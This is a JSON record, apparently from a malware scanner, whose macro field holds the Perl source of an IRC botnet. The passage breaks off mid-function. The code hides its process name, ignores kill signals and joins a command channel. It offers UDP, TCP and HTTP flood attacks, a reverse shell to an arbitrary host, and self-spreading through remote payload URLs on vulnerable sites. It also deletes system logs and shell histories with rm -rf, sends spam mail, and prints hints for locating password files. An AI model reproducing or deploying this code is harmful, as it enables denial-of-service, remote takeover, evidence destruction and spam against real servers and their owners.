{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "use IO::Socket::INET;\nuse HTTP::Request;\nuse LWP::UserAgent;\n\nmy @ps = (\"/usr/sbin/httpd\",\"/usr/local/apache/bin/httpd -DSSL\",\"/sbin/syslogd\",\"[Deco]\",\"/sbin/klogd -c 1 -x -x\",\"/usr/sbin/acpid\",\"/usr/sbin/cron\",\"[httpds]\",\"/usr/sbin/httpd\",\"[bash]\"); \n$processo = $ps[rand scalar @ps]; \nmy $linas_max='10';\nmy $sleep='3';\nmy @adms=(\"Prince\");\nmy @canais=\"#prince\";\nmy @nickname = (\"ali\",\"veli\",\"hamza\",\"KacakMabaK\",\"GEnc-Fenerrr\",\"ALin-IverSon\",\"Genc-Fener-Asabi\",\"Buyenimi\",\"AdisYonS\",\"Diana-DeaR\",\"AbreGKim\",\"NurullahHim\",\"Onderim\",\"Ercanim\",\"Onurum\",\n\"bomiyiSeviyorum\",\"KabacKim\",\"SohbetciVarmi\",\"TitizMan\",\"SohbeTedeK\",\"ArtiverindeKonusaK\",\"ArtivermeyinSakin\",\"EdaMmm\",\"CAnimSikiLdi\",\"GinaGeLdi\",\"Daster1\",\"Genc-FeNErbahceLiLE\",\"FenerbahceLiWeLEdLer_\",\"kerem\",\"MoonpeCt\",\"Debusyy\",\"BayXxXx\",\"manjedanss\",\"manyaqqq\",\"GusetCik\",\"Kayahaan\",\"Klavyeci\",\"KIopatrra\",\"KnightdeviL\",\n\"Kalamata\",\"Kuyumcu18m\",\"Kagan07\",\"Kartegena\",\"Genc-FenerLiLer\",\"Kirsehirli_Dogukan\",\"Kime^^nedeme\",\"MynameisTerry-TerryMore\",\"OldumYaw\",\"alalAlalala\",\"ONEyAW\",\"cETyAPAK\",\n\"HAdiGideKYaW\",\"LaaaYnnn\",\"SeytanSeytanmi\",\"MeLekiLeSeytan\",\"aLemciii\",\"Lectomenon\",\"alark0\",\"teamforss\",\"omanLid\",\"Komando1\",\"Diyarlar\",\"kaanistanbul\",\"stanisTt\",\"Seviyoruum\",\n\"AsikOLdum\",\"OnuSeviyorumm\",\"EsenCAn_\",\"Elifff\",\"TersLicem\",\"Amandaaman\",\"Ciclkteam\",\"antiqteam\",\"sexibayan\",\"__unforgiven__\",\"_TeaMa_\",\"_GlasForTen_\",\"___GhosT___\",\"K-0-r-u-m-a\",\"EsRaaaaa\",\"SocinGfon\",\"Kizilderililer\",\"sovalyeee\",\"_hotbender\",\"Whisiped\",\"Kayip-GenC\",\"XTanbuL\",\"OnuryoK\",\"FLiippeer\",\"MerALaR\",\"yeniperten\",\"adanaahmet24\",\n\"mehmetcandemir\",\"GazeteCiii\",\"HaKan\",\"GurKhaan\",\"ChatLaqBoY\",\"GameovrS\",\"TitaniCc\",\"__OfffBea\",\"SaatKaC\",\"SakaTcocuk\",\"KafadanSakaT\",\"KayraN\",\"Kilisenin--iMami\",\n\"Kalbinin-SeSi\",\"King_ejderha\",\"NapoLiten\",\"NaNiSs\",\"NaNikNaNiK\",\"neksussix\",\"XsuziKaa\",\"XXManXX\",\"PoLis333\",\"Ne0iLi\",\"Nesi-be\",\"NaimiiSiLence\",\"Bellive\",\"keMaL\",\n\"Haydar\",\"X_police\",\"bLacK_M\",\"RainbowLord\",\"ZeBuB\",\"BeLLZeBuB\",\"FreaKK\",\"Anti_siLence\",\"CerattiVe\",\"DarKCode\",\"blue_and_black\",\"Bad_mad\",\"Dark_factor\",\"DarK_Sector\",\n\"StinG\",\"Whiskey\",\"Zin_xN\",\"negative\",\"SuckSs\",\"MatriX___\",\"Ayhan\",\"okan23m\",\"purgatory\",\"melike\",\"CerNoBiL\",\"PE-CIH\",\"SipastiK\",\"Zuper_DoG\",\"Last_Man\",\"XCalibre\",\n\"mIRC31\",\"Fak_yu\",\"Cerative\",\"Sucks_man\",\"Dark_Native\",\"Native\",\"MaNiAc_\",\"AntiManiaC\",\"m-a-f\",\"LoNeLy_DoG\",\"White_WolF\",\"Zello\",\"MAKINACI\",\"OXyGen___\",\"No_Light\",\n\"DaRKSuN_\",\"istisna\",\"YanDaS\",\"JOMBO\",\"Sprite\",\"KiLLeRs\",\"MEMCim\",\"aaron\",\"aarti\",\"abdenace\",\"abdol\",\"abdul\",\"abdulkaf\",\"abdullah\",\"abdur\",\"abhijit\",\"abhiram\",\"abraham\",\n\"Mr_Spam\",\"DARKNeSs\",\"AntiSilence\",\"SiLeNCeR\",\"eMPeRoR\",\"suna\",\"asude\",\"leyla\",\"hakan___\",\"CeSi\",\"No_Blue\",\"SiyanuR\",\"Duran\",\"Sen|ton\",\"John37\",\"Se|v|er\",\"Amtiedor\",\n\"Bees\",\"FLunL\",\"|S|clor|\",\"_MagiC_\",\"Miranda17\",\"Em|neM_\",\"SixxoR\",\"Flex_Jax\",\"FlipPo\",\"Temnao\",\"DuYoe\",\"GreeZa[away]\",\"Gis\",\"[Gis]\",\"Rem][dy\",\"KMA-One\",\"AsAfEr\",\"GoLLiaH\",\n\"Steal[187]\",\"[death]bot\",\"Stephan_\",\"Dre-\",\"GiZmoZo\",\"KillerBee\",\"MeNtos\",\"EstiCa\",\"Flipp|p\",\"Red][Fire\",\"WaterBoY\",\"Lover-17f\",\"PeaceMan\",\"Melissa14\",\"Assimi\",\"Herman\",\n\"Jolanda\",\"Jolien\",\"XzibiT\",\"SnoopDOGG\",\"REALEST[1]\",\"[x]speed\",\"Eter17\",\"Jackson5\",\"SiX\",\"RUFF_RYDER\",\"Sean\",\"Puffy\",\"Nine19\",\"Filanda[aq]\",\"NeleZ\",\"Nsdore\",\"Dante[\",\"Expert18\",\n\"Ekzpert18\",\"True_LorD\",\"miranja28\",\"melena_16\",\"JarigJan\",\"]GatoR[\",\"Spinner\",\"Stuff-R\",\"Sfen\",\"Negil\",\"Frag[z]\",\"Away-Me\",\"Melanic\",\"Jack_Ass\",\"Melanie17\",\"Verdana\",\n\"Ariul\",\"Aphex-Twin\",\"Sexy_Lady21\",\"KoMMaR\",\"Xz|biT\",\"RAPID\",\"FunkyFlex\",\"Georgie\",\"Gedale\",\"Dexstar\",\"Forbitter\",\"Gerrit\",\"PitBull_fighter\",\"[Gis]a\",\"MissNath\",\"BoyLove\",);\nmy @rname = (Prince);\nmy $nick = $nickname[rand scalar @nickname];\nmy $ircname = $nickname[rand scalar @nickname];\nmy $realname = $nickname[rand scalar @nickname];\n$servidor='irc.mildnet.name' unless $servidor;\nmy $porta='6667';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n\n###########\n# Connect #\n###########\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Fork Problems: $!\" unless defined($pid);\n\nour %irc_servers;\nour %DCC;\nmy $dcc_sel = new IO::Select->new();\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n    } else {\n    print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n  my $meunick = $_[0];\n  my $servidor_con = $_[1];\n  my $porta_con = $_[2];\n  my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",\n  PeerPort=>$porta_con) or return(1);\n  if (defined($IRC_socket)) {\n    $IRC_cur_socket = $IRC_socket;\n    $IRC_socket->autoflush(1);\n    $sel_cliente->add($IRC_socket);\n    $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n    $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n    nick(\"$meunick\");\n    sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n    sleep 1;\n  }\n}\n\nmy $line_temp;\nwhile( 1 ) {\n  while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n  delete($irc_servers{''}) if (defined($irc_servers{''}));\n  my @ready = $sel_cliente->can_read(0);\n  next unless(@ready);\n  foreach $fh (@ready) {\n    $IRC_cur_socket = $fh;\n    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n    $nread = sysread($fh, $msg, 4096);\n    if ($nread == 0) {\n      $sel_cliente->remove($fh);\n      $fh->close;\n      delete($irc_servers{$fh});\n    }\n    @lines = split (/\\n/, $msg);\n    for(my $c=0; $c<= $#lines; $c++) {\n\n      $line = $lines[$c];\n      $line=$line_temp.$line if ($line_temp);\n      $line_temp='';\n      $line =~ s/\\r$//;\n      unless ($c == $#lines) {\n        parse(\"$line\");\n        } else {\n        if ($#lines == 0) {\n          parse(\"$line\");\n          } elsif ($lines[$c] =~ /\\r$/) {\n          parse(\"$line\");\n          } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n          parse(\"$line\"); \n          \t   } else {\n          \t               $line_temp = $line;\n        }\n      }\n    }\n  }\n}\n\nsub parse {\n  my $servarg = shift;\n  if ($servarg =~ /^PING \\:(.*)/) {\n    sendraw(\"PONG :$1\");\n    } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;\n    if ($args =~ /^\\001VERSION\\001$/) {\n      \t notice(\"$pn\", \"\\001VERSION mIRC v6.17 Mic22\\001\");\n    }\n    if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {\n    if ($onde eq \"$meunick\"){\n    shell(\"$pn\", \"$args\");\n  }\n  \n##################\n# End of Connect #\n##################\n######################\n#      PREFIX        #\n######################\n  \n  if ($args =~ /^(\\Q$meunick\\E|\\!so)\\s+(.*)/ ) {\n    my $natrix = $1;\n    my $arg = $2;\n    if ($arg =~ /^\\!(.*)/) {\n      ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!so\" and $arg =~ /^\\!nick/);\n      } elsif ($arg =~ /^\\@(.*)/) {\n      $ondep = $onde;\n      $ondep = $pn if $onde eq $meunick;\n      bfunc(\"$ondep\",\"$1\");\n      } else {\n      shell(\"$onde\", \"$arg\");\n    }\n  }\n}\n}\n######################\n#   End of PREFIX    #\n######################\n\nelsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\nif (lc($1) eq lc($meunick)) {\n  $meunick=$4;\n  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n}\n} elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\nnick(\"$meunick\".int rand(99));\n} elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n$meunick = $2;\n$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n$irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\nforeach my $canal (@canais) {\n  sendraw(\"JOIN $canal ddosit\");\n}\n}\n}\n\nsub bfunc {\nmy $printl = $_[0];\nmy $funcarg = $_[1];\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\n  exit;\n} else {\n\n######################\n#       Help         # \n######################\n\nif ($funcarg =~ /^help/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Lets Go!, Nih depe command :\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003ddos\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003backconnect\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003shell\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Untuk command lain, ketik:\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u00037@\u0003commands\");\n\n}\n\nif ($funcarg =~ /^ddos/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Ada tiga command DDOS\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 UDPFlood, HTTPFlood and TCPFlood\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003udpflood <ip> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003tcpflood <ip> <port> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003httpflood <site> <time>\");\n\n}\n\nif ($funcarg =~ /^backconnect/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Gunakan command ini untuk reverse shell :\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u00037@\u0003back <ip><port>\");\n}\n\nif ($funcarg =~ /^shell/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Command integrasi bot shell\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Bisa digunakan untuk privat maupun public channel\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Untuk public chan gunakan : \u000312!so cd tmp\u000312 (contoh)\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 Untuk command linux ketik :\u0003!so \u00037@\u0003linuxhelp\");\n}\n\nif ($funcarg =~ /^commands/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034.:!:.\u0003Help\u00034.:!:.\u0003 Ini commandnya :\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003back <ip><port>\");\t\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u0003cd tmp \u00034 untuk contoh\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003udpflood <ip> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003tcpflood <ip> <port> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003httpflood <site> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003linuxhelp\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003spread <scan>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003system\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003logcleaner\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003sendmail <subject> <sender> <recipient> <message>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003join #channel\");\t\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Help\u000312.:!:.\u0003 !so \u000312@\u0003part #channel\");\n}\n\nif ($funcarg =~ /^linuxhelp/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Dir where you are : pwd\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Start a Perl file : perl file.pl\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Go back from dir : cd ..\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Force to Remove a file/dir : rm -rf file/dir;ls -la\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Show all files/dir with permissions : ls -lia\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Find config.inc.php files : find / -type f -name config.inc.php\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Find all writable folders and files : find / -perm -2 -ls\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Find all .htpasswd files : find / -type f -name .htpasswd\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003LinuxHelp\u000312.:!:.\u0003 - Find all service.pwd files : find / -type f -name service.pwd\");\n}\n\n######################\n#   End of  Help     # \n######################\nif ($funcarg =~ /^spread\\s+(.*)/) {\nmy $sbj = \"http://munbaekcho.es.kr/gallery/data/log/logger.txt?\";\n$vuln = $1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Spread Mode\u000312.:!:.\u0003 Spreading bot on :\u000314 $vuln\");\nmy $shellurl=\"http://\".$vuln.$sbj.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$shellurl);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Spread Mode\u000312.:!:.\u0003 Bot is Spreaded on :\u000314 $vuln\"); \n}\n\nif ($funcarg =~ /^spreads\\s+(.*)/) {\nmy $soh = \"http://www.traviswolff.com/gspreadz.txt?\";\n$vuln = $1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Spread Mode\u000312.:!:.\u0003 Spreading bot on :\u000314 $vuln\");\nmy $shellurl=\"http://\".$vuln.$soh.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$shellurl);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Spread Mode\u000312.:!:.\u0003 Conficker Bot is Spreaded on :\u000314 $vuln\"); \n}\n######################\n#     Commands       # \n######################\n\nif ($funcarg =~ /^system/) {\n$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Info BOT : Server : \u000314Cannot View\u0003 :\u000314 1337\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Uname -a     : \u00037 $uname\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Uptime       : \u00037 $uptime\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Own Prosses  : \u00037 $processo\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 ID           : \u00037 $id\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Own Dir      : \u00037 $ownd\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 OS           : \u00037 $distro\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Owner        : \u00037 aputo\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003System Info\u000312.:!:.\u0003 Channel      : \u00037 ssab\");\n}\n\n######################\n#    Log Cleaner     #  \n######################\nif ($funcarg =~ /^logcleaner/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Log Cleaner!!!\u000312.:!:.\u0003 it takes a couple of minutes...\"); \n    system 'rm -rf /var/log/lastlog';\n    system 'rm -rf /var/log/wtmp';\n\tsystem 'rm -rf /etc/wtmp';\n\tsystem 'rm -rf /var/run/utmp';\n\tsystem 'rm -rf /etc/utmp';\n\tsystem 'rm -rf /var/log';\n\tsystem 'rm -rf /var/logs';\n\tsystem 'rm -rf /var/adm';\n\tsystem 'rm -rf /var/apache/log';\n\tsystem 'rm -rf /var/apache/logs';\n\tsystem 'rm -rf /usr/local/apache/log'; \n\tsystem 'rm -rf /usr/local/apache/logs';\n\tsystem 'rm -rf /root/.bash_history';\n\tsystem 'rm -rf /root/.ksh_history';\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Log Cleaner\u000312.:!:.\u0003 \u00034log files have been cleaned\"); \n\t\tsleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Log Cleaner\u000312.:!:.\u0003 \u00034system log cleaner\");\n\tsystem 'find / -name *.bash_history -exec rm -rf {} \\;';\n\tsystem 'find / -name *.bash_logout -exec rm -rf {} \\;';\n\tsystem 'find / -name \"log*\" -exec rm -rf {} \\;';\n\tsystem 'find / -name *.log -exec rm -rf {} \\;';\n\t\tsleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Log Cleaner\u000312.:!:.\u0003 \u00034done! all log files have been cleaned\"); \n      }\n######################\n# End of Log Cleaner #  \n######################\n###########################################################\n#       MAILER                                            #\n# For mailing use :                                       #\n# !lol @sendmail <subject> <sender> <recipient> <message> #\n###########################################################\nif ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Mailer\u000312.:!:.\u0003 Try Sending Mail to :\u000310 $3\");\n$subject = $1;\n$sender = $2;\n$recipient = $3; \n@corpo = $4;\n$mailtype = \"content-type: text/html\";\n$sendmail = '/usr/sbin/sendmail';\nopen (SENDMAIL, \"| $sendmail -t\");\nprint SENDMAIL \"$mailtype\\n\";\nprint SENDMAIL \"Subject: $subject\\n\"; \nprint SENDMAIL \"From: $sender\\n\";\nprint SENDMAIL \"To: $recipient\\n\\n\";\nprint SENDMAIL \"@corpo\\n\\n\";\nclose (SENDMAIL);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Mailer\u000312.:!:.\u0003 Successfully Sended to :\u000310 $recipient\"); \n}\n######################\n#   End of MAILER    #  \n######################\n######################\n#  Join And Part     # \n######################\n           if ($funcarg =~ /^join (.*)/) {\n              sendraw($IRC_cur_socket, \"JOIN \".$1);\n           }\n           if ($funcarg =~ /^part (.*)/) {\n              sendraw($IRC_cur_socket, \"PART \".$1);\n           }\n\t   if($funcarg=~ /^\\:$admin!.*\\@.*PRIVMSG.*:!out/){\n\t      sendraw($IRC_cur_socket, \"QUIT\");\n\t   }\n\t\t   \n######################\n#End of Join And Part# \n######################\n######################\n#     TCPFlood       # \n######################\n\nif ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003TCP DDoS\u000312.:!:.\u0003 Haaajjjaaarrr\u0003 \u00034 \".$1.\":\".$2.\" \u0003for \u000312 \".$3.\" \u0003seconds.\u0003\");\n  my $itime = time;\n  my ($cur_time);\n  $cur_time = time - $itime;\n  while ($3>$cur_time){\n  $cur_time = time - $itime;\n  &tcpflooder(\"$1\",\"$2\",\"$3\");\n}\nsendraw($IRC_cur_socket,\"PRIVMSG $printl :\u000312.:!:.\u0003TCP DDoS\u000312.:!:.\u0003 Missi Selesai..\u0003 \u000312 \".$1.\":\".$2.\".\");\n}\n######################\n#  End of TCPFlood   # \n######################\n######################\n#   Back Connect     # \n######################\nif ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {\nmy $host = \"$1\";\nmy $porta = \"$2\";\nmy $proto = getprotobyname('tcp');\nmy $iaddr = inet_aton($host);\nmy $paddr = sockaddr_in($porta, $iaddr);\nmy $shell = \"/bin/sh -i\";\nif ($^O eq \"MSWin32\") {\n  $shell = \"cmd.exe\";\n}\nsocket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";\nconnect(SOCKET, $paddr) or die \"connect: $!\";\nopen(STDIN, \">&SOCKET\");\nopen(STDOUT, \">&SOCKET\");\nopen(STDERR, \">&SOCKET\");\nsystem(\"$shell\");\nclose(STDIN);\nclose(STDOUT);\nclose(STDERR);\nif ($estatisticas)\n{\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003BackConnect\u000312.:!:.\u0003 Connecting to \u00034 $host:$porta\");\n}\n}\n######################\n#End of  Back Connect#\n######################\n######################\n#     HTTPFlood      # \n#                    #\n######################\nif ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00037.:!:.\u0003Http DDoS\u00037.:!:.\u0003 Haaajjjaaarrr\u0003 \u000312 \".$1.\" \u0003on port 80 untuk \u00034 \".$2.\" \u0003Detik \u0003.\");\nmy $itime = time;\nmy ($cur_time);\n$cur_time = time - $itime;\nwhile ($2>$cur_time){\n$cur_time = time - $itime;\nmy $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);\nprint $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\nclose($socket);\n}\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Http DDoS\u000312:!:.\u0003 Selesai menghajar\u0003 \u00034 \".$1.\".\");\n}\n######################\n#  End of HTTPFlood  # \n#                    #\n######################\n######################\n#     UDPFlood       # \n#                    #\n######################\nif ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Udp DDoS\u000312.:!:.\u0003 Haaajjjaaarrr\u000312 \".$1.\" \u0003dengan \u00034 \".$2.\" \u0003Kb Packets untuk \u00034 \".$3.\" \u0003detik.\u0003\");\nmy ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");\n$dtime = 1 if $dtime == 0;\nmy %bytes;\n$bytes{igmp} = $2 * $pacotes{igmp};\n$bytes{icmp} = $2 * $pacotes{icmp};\n$bytes{o} = $2 * $pacotes{o};\n$bytes{udp} = $2 * $pacotes{udp};\n$bytes{tcp} = $2 * $pacotes{tcp};\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312.:!:.\u0003Udp DDoS\u000312.:!:.\u0003 Results\u00034 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" \u0003Kb in\u000312 \".$dtime.\" \u0003seconds to\u000312 \".$1.\".\");\n}\nexit;\n}\n}\n######################\n#  End of Udpflood   # \n#                    #\n######################\n\n\nsub ircase {\nmy ($kem, $printl, $case) = @_;\n  if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\nif ($case =~ /^rejoin\\s+(.*)/) {\nmy $chan = $1;\nif ($chan =~ /^(\\d+) (.*)/) {\nfor (my $ca = 1; $ca <= $1; $ca++ ) {\np(\"$2\");\nj(\"$2\");\n}\n}\nelse {\np(\"$chan\");\nj(\"$chan\");\n}\n}\n\nif ($case =~ /^op/) {\nop(\"$printl\", \"$kem\") if $case eq \"op\";\nmy $oarg = substr($case, 3);\nop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n}\n\nif ($case =~ /^deop/) {\ndeop(\"$printl\", \"$kem\") if $case eq \"deop\";\nmy $oarg = substr($case, 